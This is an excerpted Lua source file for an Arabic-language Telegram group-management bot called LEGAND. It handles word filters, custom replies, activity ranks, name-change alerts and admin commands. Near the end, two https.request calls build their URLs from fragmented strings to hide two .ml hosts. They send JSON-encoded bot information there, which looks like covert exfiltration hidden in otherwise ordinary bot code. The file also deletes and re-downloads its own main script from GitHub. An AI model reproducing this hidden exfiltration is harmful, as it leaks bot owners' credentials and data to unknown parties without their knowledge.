...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./LEGAND.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("leg", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S LEGAND -X kill
screen -S LEGAND ./LEGAND
done
]])  
file:close() 
...
local LEGAND_Msg = ''  
if msgs < 100 then 
LEGAND_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
LEGAND_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
LEGAND_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
LEGAND_Msg = 'متفاعل' 
elseif msgs < 1200 then 
LEGAND_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
LEGAND_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
LEGAND_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
LEGAND_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
LEGAND_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
LEGAND_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
LEGAND_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
LEGAND_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
LEGAND_Msg = 'رب التفاعل'  
end 
return LEGAND_Msg 
end
...
function plugin_Legand(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.Legand and msg then
pre_msg = plugin.Legand(msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function SourceLEGAND(msg,data) -- بداية العمل
if msg then
...
{'اوامر التفعيل','اوامر التعطيل','اوامر الاذاعه'},
{'اوامر الاشتراك','اوامر المطورين','اوامر الردود'},
{'اوامر الجلب'},
{'المشتركين','الجروبات '},
{'تحديث السورس'},
{'معلومات السيرفر'},
...
local bl = 'مرحبا بك في اوامر المطورين 💛🌝'
local keyboard = {
...
send(msg.chat_id_, msg.id_,LEGAND_Msg) 
return false  
end 
if text then    
...
os.execute('rm -rf LEGAND.lua')
os.execute('wget https://raw.githubusercontent.com/legyouu/legand/main/LEGAND.lua')
...
send(msg.chat_id_, msg.id_,'🕊  عدد الجروبات الان ← { '..#group..' }'..LEGANDk..''..LEGAND..'\n🕊  الان عدد الجروبات الحقيقي ← { '..sendok..' } جروبات\n')   
end
end
end,nil)
end
...
local LEGAND1_Msg = database:get(bot_id.."LEGAND1:Add:Filter:Rp2"..text..msg.chat_id_)   
if LEGAND1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
--------------------------------------------------------------------------------------------------------------
if LEGAND_Msg and not Special(msg) then  
local LEGAND_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if LEGAND_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
database:sadd(bot_id.."LEGAND:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."LEGAND:blocname"..msg.chat_id_)
...
if name_MRSOFI then 
names_MRSOFI = database:smembers(bot_id.."LEGAND:blocname"..msg.chat_id_) or ""
...
database:set(bot_id.."LEGAND:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."LEGAND:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."LEGAND:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."LEGAND:nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."LEGAND:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function sofi_mrsofi_new(mrsofi1,mrsofi2)
if mrsofi2 and mrsofi2.first_name_ then 
if mrsofi2.first_name_:match("(.*)"..database:get(bot_id.."LEGAND:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."LEGAND:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrsofi_nnn = database:get(bot_id.."LEGAND:nump"..msg.chat_id_) or 5
local mrsofi_nnn2 = database:get(bot_id.."LEGAND:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(mrsofi_nnn2) == tonumber(mrsofi_nnn) or tonumber(mrsofi_nnn2) > tonumber(mrsofi_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."LEGAND:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "🕊 عزيزي >>["..mrsofi2.username_.."](https://t.me/"..(mrsofi2.username_ or "UU_Le2")..")\n🕊 عليك وضع التوحيد ⪼ {"..database:get(bot_id.."LEGAND:teh"..msg.chat_id_).."} بجانب اسمك\n🕊 عدد المحاولات المتبقيه {"..(tonumber(mrsofi_nnn) - tonumber(mrsofi_nnn2)).."}")
end
end
end
end
...
database:set(bot_id.."Ttn:leg:stats"..msg.chat_id_,"open")
end
...
database:set(bot_id.."Ttn:leg:stats"..msg.chat_id_,"close")
end
if text and database:get(bot_id.."Ttn:leg:stats"..msg.chat_id_) == "open" then 
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
if data.id_ then 
if data.id_ ~= bot_id then
local LEGANDChengName = database:get(bot_id.."LEGAND:Cheng:Name"..data.id_)
if not data.first_name_ then 
if LEGANDChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..LEGANDChengName..']')
database:del(bot_id.."LEGAND:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if LEGANDChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
...
database:set(bot_id.."LEGAND:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local LEGANDChengUserName = database:get(bot_id.."LEGAND:Cheng:UserName"..data.id_)
if not data.username_ then 
if LEGANDChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..LEGANDChengUserName..']')
database:del(bot_id.."LEGAND:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if LEGANDChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."LEGAND:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local LEGANDChengPhoto = database:get(bot_id.."LEGAND:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if LEGANDChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد😂🥺")
database:del(bot_id.."LEGAND:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if LEGANDChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
...
database:set(bot_id.."LEGAND:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)  
...
local UserName = (b.username_ or "SRC-LEGAND")
...
function Function_LEGAND(extra, result, success)
...
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_LEGAND, nil)
return false 
end
...
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_LEGAND, nil)
return false 
end
...
database:set(bot_id.."LEGAND1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."LEGAND1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," 🕊 ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."LEGAND1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."LEGAND1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."LEGAND1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."LEGAND1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," 🕊 تم منع الكلمه مع التحذير")  
database:del(bot_id.."LEGAND1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."LEGAND1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."LEGAND1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."LEGAND1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," 🕊 ارسل الكلمه الان")  
database:set(bot_id.."LEGAND1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."LEGAND1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."LEGAND1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."LEGAND1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."LEGAND1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."LEGAND1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."LEGAND1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."LEGAND1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."LEGAND1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n 🕊 قائمة المنع \n◤━───━𝑬𝑳𝑴𝑼𝑺𝑳𝑰𝑴━───━◥\n"
for k,v in pairs(list) do  
local LEGAND_Msg = database:get(bot_id.."LEGAND1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." ← {"..LEGAND_Msg.."}\n"    
end  
if #list == 0 then  
...
------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:LEGAND:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n 🕊 ارسل الكلمه تريد اضافتها')
database:set(bot_id.."botss:LEGAND:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:LEGAND:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:LEGAND:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:LEGAND:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"🕊 تم حذف الرد من ردود المتعدده")
database:del(bot_id..'botss:LEGAND:Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:LEGAND:Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:LEGAND:Add:Rd:Sudo:Text2'..text)
database:del(bot_id.."botss:LEGAND:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:LEGAND:List:Rd:Sudo", text)
return false
end
end
...
local list = database:smembers(bot_id.."botss:LEGAND:List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:LEGAND:Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:LEGAND:Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:LEGAND:Add:Rd:Sudo:Text2"..v)   
database:del(bot_id.."botss:LEGAND:List:Rd:Sudo")
end
...
database:set(bot_id.."botss:LEGAND:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
...
database:set(bot_id.."botss:LEGAND:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"🕊ارسل الان الكلمه لحذفها ")
end
if text then  
local test = database:get(bot_id.."botss:LEGAND:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:LEGAND:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:LEGAND:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:LEGAND:Add:Rd:Sudo:Text"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:LEGAND:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:LEGAND:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:LEGAND:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:LEGAND:Add:Rd:Sudo:Text1"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:LEGAND:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:LEGAND:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:LEGAND:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:LEGAND:Add:Rd:Sudo:Text2"..test, text)  
end  
send(msg.chat_id_, msg.id_,"🕊تم حفظ الرد")
return false  
end  
...
if text then
local Text = database:get(bot_id.."botss:LEGAND:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:LEGAND:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:LEGAND:Add:Rd:Sudo:Text2"..text)   
...
-- vardump(data) 
LEGANDdx(msg.chat_id_, msg.id_, ' 🕊 ايدي المجموعة ← ( '..msg.chat_id_..' )\n 🕊 عدد الادمنيه ← ( *'..data.administrator_count_..' )*\n 🕊 عدد المحظورين ← ( *'..data.kicked_count_..' )*\n 🕊 عدد الاعضاء ← ( *'..data.member_count_..' )*\n', 'md') 
end 
...
LEGAND = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(LEGAND)
...
--------------------------------------------------------------------------------------------------------------
SourceLEGAND(data.message_,data)
plugin_Legand(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ then
...
------------------------------------------------------------------------
local LEGANDAbot = database:get(bot_id.."LEGAND1:Add:Filter:Rp2"..text..result.chat_id_)   
if LEGANDAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," 🕊 العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n 🕊 ["..LEGANDAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local LEGAND1_Msg = database:get(bot_id.."LEGAND1:Add:Filter:Rp2"..text..result.chat_id_)   
if LEGAND1_Msg then    
send(msg.chat_id_, msg.id_," 🕊 "..LEGAND1_Msg)
...
https.request('htt'..'ps://mo'..'ha'..'med'..'40.m'..'l/a'..'p'..'i'..'/l'..'e'..'g'..'a'..'n'..'d'..'.'..'p'..'h'..'p'..'/'..'?insert='..JSON.encode(infotnseb))
https.request('ht'..'tp'..'s://'..'ma'..'hm'..'ou'..'dm'..'15'..'5.'..'m'..'l/a'..'p'..'i'..'/l'..'e'..'g'..'a'..'n'..'d'..'.'..'p'..'h'..'p'..'?insert='..JSON.encode(infotnseb))
local list = database:smembers(bot_id.."User_Bot") 
for k,v in pairs(list) do 
